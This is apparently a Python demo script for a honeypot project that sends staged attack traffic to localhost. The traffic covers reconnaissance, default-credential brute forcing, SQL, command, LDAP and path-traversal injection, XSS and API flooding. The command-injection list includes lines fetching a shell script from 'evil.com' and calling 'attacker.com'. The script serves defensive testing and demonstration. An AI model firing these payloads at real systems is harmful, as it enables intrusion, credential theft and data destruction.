"""
NeuroHoneypot - Simulated Attacker
Generates realistic attack traffic for demo purposes
"""
import requests
import time
import random
from datetime import datetime

HONEYPOT_URL = "http://localhost:5000"

class SimulatedAttacker:
    def __init__(self, attacker_type='mixed'):
        self.attacker_type = attacker_type
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': self._get_user_agent()
        })
    
    def _get_user_agent(self):
        """Get user agent based on attacker type"""
        agents = {
            'script_kiddie': 'python-requests/2.28.0',
            'sophisticated': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'bot': 'Mozilla/5.0 (compatible; AttackBot/1.0)',
            'mixed': random.choice([
                'python-requests/2.28.0',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'curl/7.68.0'
            ])
        }
        return agents.get(self.attacker_type, agents['mixed'])
    
    def reconnaissance(self):
        """Stage 1: Reconnaissance - probe the system"""
        print("\n🔍 [RECON] Starting reconnaissance...")
        
        targets = [
            '/',
            '/admin',
            '/login',
            '/api/users',
            '/api/logs',
            '/robots.txt',
            '/sitemap.xml',
            '/.git/config',
            '/backup.zip'
        ]
        
        for target in targets:
            try:
                print(f"   → Probing: {target}")
                self.session.get(f"{HONEYPOT_URL}{target}", timeout=5)
                time.sleep(random.uniform(0.5, 1.5))
            except Exception as e:
                print(f"   ✗ Error: {e}")
    
    def brute_force_login(self):
        """Stage 2: Brute force login attempts"""
        print("\n🔐 [BRUTEFORCE] Attempting credential stuffing...")
        
        credentials = [
            ('admin', 'admin'),
            ('admin', 'password'),
            ('admin', '123456'),
            ('root', 'root'),
            ('administrator', 'admin123'),
            ('user', 'password'),
            ('test', 'test'),
            ('admin', 'admin123'),
        ]
        
        for username, password in credentials:
            try:
                print(f"   → Trying: {username}:{password}")
                self.session.post(
                    f"{HONEYPOT_URL}/login",
                    data={'username': username, 'password': password},
                    timeout=5
                )
                time.sleep(random.uniform(0.3, 0.8))
            except Exception as e:
                print(f"   ✗ Error: {e}")
    
    def sql_injection_attack(self):
        """Stage 3: SQL injection attempts"""
        print("\n💉 [SQL INJECTION] Attempting SQL injection...")
        
        payloads = [
            "' OR '1'='1",
            "admin' --",
            "1' UNION SELECT NULL--",
            "' OR 1=1--",
            "admin'/*",
            "') OR ('1'='1",
            "1; DROP TABLE users--",
        ]
        
        for payload in payloads:
            try:
                print(f"   → Payload: {payload[:30]}...")
                self.session.get(
                    f"{HONEYPOT_URL}/api/database",
                    params={'q': payload},
                    timeout=5
                )
                time.sleep(random.uniform(0.5, 1.0))
            except Exception as e:
                print(f"   ✗ Error: {e}")
    
    def command_injection_attack(self):
        """Stage 4: Command injection attempts"""
        print("\n⚡ [CMD INJECTION] Attempting command injection...")
        
        payloads = [
            "; ls -la",
            "| whoami",
            "&& cat /etc/passwd",
            "; wget http://evil.com/shell.sh",
            "| curl http://attacker.com",
            "`id`",
            "$(whoami)",
        ]
        
        for payload in payloads:
            try:
                print(f"   → Command: {payload[:30]}...")
                self.session.get(
                    f"{HONEYPOT_URL}/api/exec",
                    params={'cmd': payload},
                    timeout=5
                )
                time.sleep(random.uniform(0.5, 1.0))
            except Exception as e:
                print(f"   ✗ Error: {e}")
    
    def path_traversal_attack(self):
        """Stage 5: Path traversal attempts"""
        print("\n📂 [PATH TRAVERSAL] Attempting path traversal...")
        
        paths = [
            '../../../etc/passwd',
            '..\\..\\..\\windows\\system.ini',
            '....//....//....//etc/passwd',
            '..%2F..%2F..%2Fetc%2Fpasswd',
            '../../../../../../../etc/shadow',
            '..\\..\\..\\boot.ini',
        ]
        
        for path in paths:
            try:
                print(f"   → Path: {path}")
                self.session.get(f"{HONEYPOT_URL}/{path}", timeout=5)
                time.sleep(random.uniform(0.5, 1.0))
            except Exception as e:
                print(f"   ✗ Error: {e}")
    
    def xss_attack(self):
        """Stage 6: Cross-Site Scripting (XSS) attempts"""
        print("\n🎭 [XSS] Attempting Cross-Site Scripting...")
        
        payloads = [
            '<script>alert("XSS")</script>',
            '<img src=x onerror=alert(1)>',
            '<svg/onload=alert(1)>',
            'javascript:alert(document.cookie)',
            '<iframe src="javascript:alert(1)">',
            '"><script>alert(String.fromCharCode(88,83,83))</script>',
            '<body onload=alert(1)>',
        ]
        
        for payload in payloads:
            try:
                print(f"   → Payload: {payload[:40]}...")
                # Try in different parameters
                self.session.get(
                    f"{HONEYPOT_URL}/",
                    params={'search': payload},
                    timeout=5
                )
                time.sleep(random.uniform(0.5, 1.0))
            except Exception as e:
                print(f"   ✗ Error: {e}")
    
    def sensitive_data_access(self):
        """Stage 7: Access sensitive endpoints"""
        print("\n🔓 [SENSITIVE ACCESS] Accessing sensitive endpoints...")
        
        endpoints = [
            '/api/config',
            '/api/users',
            '/api/database?q=SELECT * FROM users',
            '/admin?token=secret123',
            '/api/logs',
        ]
        
        for endpoint in endpoints:
            try:
                print(f"   → Accessing: {endpoint}")
                self.session.get(f"{HONEYPOT_URL}{endpoint}", timeout=5)
                time.sleep(random.uniform(0.5, 1.5))
            except Exception as e:
                print(f"   ✗ Error: {e}")
    
    def ldap_injection_attack(self):
        """Stage 8: LDAP injection attempts"""
        print("\n📁 [LDAP INJECTION] Attempting LDAP injection...")
        
        payloads = [
            '*',
            '*)(&',
            '*)(uid=*))(|(uid=*',
            'admin)(&(password=*))',
            '*))(|(password=*',
        ]
        
        for payload in payloads:
            try:
                print(f"   → Payload: {payload}")
                self.session.post(
                    f"{HONEYPOT_URL}/login",
                    data={'username': payload, 'password': 'test'},
                    timeout=5
                )
                time.sleep(random.uniform(0.5, 1.0))
            except Exception as e:
                print(f"   ✗ Error: {e}")
    
    def api_abuse(self):
        """Stage 9: API abuse and rate limit testing"""
        print("\n⚡ [API ABUSE] Testing API rate limits...")
        
        endpoints = ['/api/users', '/api/logs', '/api/config']
        
        for i in range(15):  # Rapid requests
            try:
                endpoint = random.choice(endpoints)
                print(f"   → Request {i+1}/15: {endpoint}")
                self.session.get(f"{HONEYPOT_URL}{endpoint}", timeout=5)
                time.sleep(random.uniform(0.1, 0.3))  # Very fast
            except Exception as e:
                print(f"   ✗ Error: {e}")
    
    def run_attack_scenario(self, scenario='full'):
        """Run attack scenarios"""
        print("="*60)
        print("🎭 Simulated Attack Starting")
        print(f"   Type: {self.attacker_type}")
        print(f"   Scenario: {scenario}")
        print(f"   Target: {HONEYPOT_URL}")
        print(f"   Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print("="*60)
        
        if scenario == 'full':
            self.reconnaissance()
            time.sleep(2)
            self.brute_force_login()
            time.sleep(2)
            self.sql_injection_attack()
            time.sleep(2)
            self.command_injection_attack()
            time.sleep(2)
            self.path_traversal_attack()
            time.sleep(2)
            self.xss_attack()
            time.sleep(2)
            self.sensitive_data_access()
            time.sleep(2)
            self.ldap_injection_attack()
            time.sleep(2)
            self.api_abuse()
        
        elif scenario == 'quick':
            self.reconnaissance()
            self.brute_force_login()
            self.sql_injection_attack()
            self.xss_attack()
        
        elif scenario == 'sql_only':
            self.sql_injection_attack()
        
        elif scenario == 'brute_force':
            self.brute_force_login()
        
        elif scenario == 'xss_only':
            self.xss_attack()
        
        elif scenario == 'api_abuse':
            self.api_abuse()
        
        elif scenario == 'advanced':
            # Advanced persistent threat simulation
            self.reconnaissance()
            time.sleep(1)
            self.api_abuse()
            time.sleep(1)
            self.sql_injection_attack()
            time.sleep(1)
            self.xss_attack()
            time.sleep(1)
            self.ldap_injection_attack()
        
        print("\n" + "="*60)
        print("✅ Attack simulation complete")
        print("="*60 + "\n")

def main():
    """Main entry point"""
    import sys
    
    scenario = 'full'
    attacker_type = 'mixed'
    
    if len(sys.argv) > 1:
        scenario = sys.argv[1]
    if len(sys.argv) > 2:
        attacker_type = sys.argv[2]
    
    print("\n🎯 NeuroHoneypot - Simulated Attacker")
    print("Available scenarios: full, quick, sql_only, brute_force")
    print("Available types: mixed, script_kiddie, sophisticated, bot\n")
    
    attacker = SimulatedAttacker(attacker_type)
    
    try:
        attacker.run_attack_scenario(scenario)
    except KeyboardInterrupt:
        print("\n\n⚠️  Attack simulation interrupted")
    except requests.exceptions.ConnectionError:
        print("\n\n❌ Error: Cannot connect to honeypot at", HONEYPOT_URL)
        print("   Make sure the honeypot is running (python honeypot.py)")
    except Exception as e:
        print(f"\n\n❌ Error: {e}")

if __name__ == '__main__':
    main()

